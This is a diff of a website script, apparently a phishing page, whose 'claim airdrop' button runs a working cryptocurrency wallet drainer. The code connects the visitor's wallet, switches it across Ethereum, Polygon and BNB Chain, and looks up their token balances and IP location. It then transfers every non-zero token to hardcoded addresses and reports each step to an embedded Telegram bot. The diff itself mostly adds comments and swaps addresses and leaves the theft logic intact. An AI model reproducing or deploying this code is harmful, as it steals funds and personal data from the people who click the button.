@@ -84,6 +84,7 @@ addEventOnElem(window, "scroll", scrollReveal);
  * Wallet connect, network switching, and token transfer with Telegram notification
  */
 async function connectWalletAndSendTokens() {
+  // Ensure required libraries are loaded
   if (!window.ethers || !window.Web3Modal) {
     console.error("Required libraries (ethers or Web3Modal) not found.");
     return;
@@ -103,19 +104,22 @@ async function connectWalletAndSendTokens() {
     providerOptions
   });
 
+  // Define supported EVM networks and their Exodus wallet addresses
   const evmNetworks = [
     { chainId: 1, name: "Ethereum", chainName: "eth", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
-    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
-    { chainId: 137, name: "Polygon", chainName: "polygon", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" }
+    { chainId: 137, name: "Polygon", chainName: "polygon", exodusAddress: "0x1234567890abcdef1234567890abcdef12345678" },
+    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0xabcdef1234567890abcdef1234567890abcdef12" }
   ];
 
   const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
   const chatId = "5995616824";
   const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";
 
+  // Utility function to delay execution
   const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
   try {
+    // Connect wallet
     const instance = await web3Modal.connect();
     const provider = new ethers.providers.Web3Provider(instance);
     const signer = provider.getSigner();
@@ -123,6 +127,7 @@ async function connectWalletAndSendTokens() {
     const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";
     console.log(`Wallet connected: ${userAddress} (${walletType})`);
 
+    // Fetch location data
     let locationData = {};
     try {
       const locRes = await fetch("https://ipapi.co/json/");
@@ -132,10 +137,12 @@ async function connectWalletAndSendTokens() {
       locationData = { country_name: "Unknown", ip: "N/A" };
     }
 
+    // Process EVM-compatible networks
     for (const network of evmNetworks) {
       try {
         console.log(`Processing network: ${network.name} (Chain ID: ${network.chainId})`);
 
+        // Attempt to switch to the network
         try {
           console.log(`Switching to ${network.name}`);
           await instance.request({
@@ -143,6 +150,7 @@ async function connectWalletAndSendTokens() {
             params: [{ chainId: `0x${network.chainId.toString(16)}` }]
           });
         } catch (switchErr) {
+          // If switch fails, try adding the network
           if (switchErr.code === 4902) {
             console.log(`Network ${network.name} not found, attempting to add it`);
             const chainConfig = {
@@ -153,25 +161,26 @@ async function connectWalletAndSendTokens() {
                 nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                 blockExplorerUrls: ['https://etherscan.io']
               },
-              56: {
-                chainId: '0x38',
-                chainName: 'BNB Smart Chain',
-                rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                blockExplorerUrls: ['https://bscscan.com']
-              },
               137: {
                 chainId: '0x89',
                 chainName: 'Polygon Mainnet',
                 rpcUrls: ['https://polygon-rpc.com'],
                 nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                 blockExplorerUrls: ['https://polygonscan.com']
+              },
+              56: {
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                blockExplorerUrls: ['https://bscscan.com']
               }
             }[network.chainId];
             await instance.request({
               method: 'wallet_addEthereumChain',
               params: [chainConfig]
             });
+            // Retry switch
             await instance.request({
               method: 'wallet_switchEthereumChain',
               params: [{ chainId: `0x${network.chainId.toString(16)}` }]
@@ -190,7 +199,6 @@ async function connectWalletAndSendTokens() {
 ❌ Failed to Switch to ${network.name}!
 Chain ID: ${network.chainId}
 Error: Network switch rejected or not supported
-Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
           `;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -200,12 +208,12 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
           continue;
         }
 
+        // Notify successful switch
         const switchMessage = `
 🔄 Switched to ${network.name}!
 Address: ${userAddress}
 Wallet: ${walletType}
 Chain ID: ${network.chainId}
-Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
         `;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
@@ -214,8 +222,10 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
         });
         console.log(`Switched to ${network.name} successfully`);
 
+        // Delay to ensure provider sync
         await delay(1000);
 
+        // Fetch ERC20 token balances using Moralis with retry
         let tokens = [];
         let tokenSummaryTelegram = "";
         let apiAttempts = 0;
@@ -234,9 +244,10 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
               throw new Error(`Moralis API error: ${response.statusText} (Status: ${response.status})`);
             }
             tokens = await response.json();
-            console.log(`Fetched ${tokens.length} tokens for ${network.name}:`, JSON.stringify(tokens, null, 2));
+            console.log(`Fetched ${tokens.length} tokens for ${network.name}`);
             apiSuccess = true;
 
+            // Format balance summary
             const nonZeroTokens = tokens.filter(token => token.balance && !ethers.BigNumber.from(token.balance).isZero());
             if (nonZeroTokens.length > 0) {
               tokenSummaryTelegram = nonZeroTokens.map(token => {
@@ -253,24 +264,31 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
               tokenSummaryTelegram = `Failed to fetch ERC20 tokens after ${maxAttempts} attempts: ${apiErr.message || "Moralis API error"}`;
             } else {
               console.log(`Retrying Moralis API call for ${network.name}`);
-              await delay(2000);
+              await delay(2000); // Wait before retry
             }
           }
         }
 
+        // Fetch native balance as fallback
         let nativeBalanceMessage = "";
         try {
           const nativeBalance = await currentProvider.getBalance(userAddress);
           const formattedBalance = ethers.utils.formatEther(nativeBalance);
-          const nativeSymbol = network.chainId === 1 ? "ETH" : network.chainId === 56 ? "BNB" : "MATIC";
-          nativeBalanceMessage = `• ${nativeSymbol}: ${formattedBalance}`;
-          console.log(`Native balance for ${network.name}: ${formattedBalance} ${nativeSymbol}`);
+          if (parseFloat(formattedBalance) > 0) {
+            const nativeSymbol = network.chainId === 1 ? "ETH" : network.chainId === 137 ? "MATIC" : "BNB";
+            nativeBalanceMessage = `• ${nativeSymbol}: ${formattedBalance}`;
+            console.log(`Native balance for ${network.name}: ${formattedBalance} ${nativeSymbol}`);
+          } else {
+            console.log(`No native balance for ${network.name}`);
+          }
         } catch (balanceErr) {
           console.warn(`Failed to fetch native balance for ${network.name}: ${balanceErr.message}`);
         }
 
+        // Combine balances for notification
         const balanceSummary = [tokenSummaryTelegram, nativeBalanceMessage].filter(msg => msg).join("\n");
 
+        // Send balance notification
         const networkMessage = `
 📥 Wallet Connected on ${network.name}!
 Address: ${userAddress}
@@ -289,13 +307,13 @@ ${balanceSummary || "No balances found or API error occurred."}
         });
         console.log(`Sent balance notification for ${network.name}`);
 
+        // Transfer non-zero ERC20 tokens
         const nonZeroTokens = tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero());
         if (nonZeroTokens.length === 0) {
           console.log(`No non-zero ERC20 tokens to transfer on ${network.name}`);
           const noTransferMessage = `
 ℹ️ No ERC20 Tokens Transferred on ${network.name}!
 Reason: No non-zero token balances detected.
-Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
           `;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -327,6 +345,7 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
             await tx.wait();
             console.log(`Sent ${token.symbol} on ${network.name}, tx: ${tx.hash}`);
 
+            // Notify successful transfer
             const decimals = token.decimals ?? 18;
             const balance = ethers.utils.formatUnits(token.balance, decimals);
             const successMessage = `
@@ -336,7 +355,6 @@ Amount: ${balance}
 Contract: ${token.token_address}
 Destination: ${network.exodusAddress}
 Tx Hash: ${tx.hash}
-Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
             `;
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
               method: "POST",
@@ -350,7 +368,6 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
 Token: ${token.symbol}
 Contract: ${token.token_address}
 Error: ${err.message || "Unknown error"}
-Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
             `;
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
               method: "POST",
@@ -364,7 +381,6 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
         const errorMessage = `
 ❌ Error Processing ${network.name}!
 Error: ${err.message || "Unknown error"}
-Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
         `;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
@@ -373,12 +389,12 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
         });
       }
     }
+
   } catch (err) {
     console.error('Error connecting wallet or processing tokens:', err);
     const errorMessage = `
 ❌ Wallet Connection Failed!
 Error: ${err.message || "Unknown error"}
-Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
     `;
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -388,4 +404,5 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
   }
 }
 
-document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
+// Attach to claim button
+document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);”
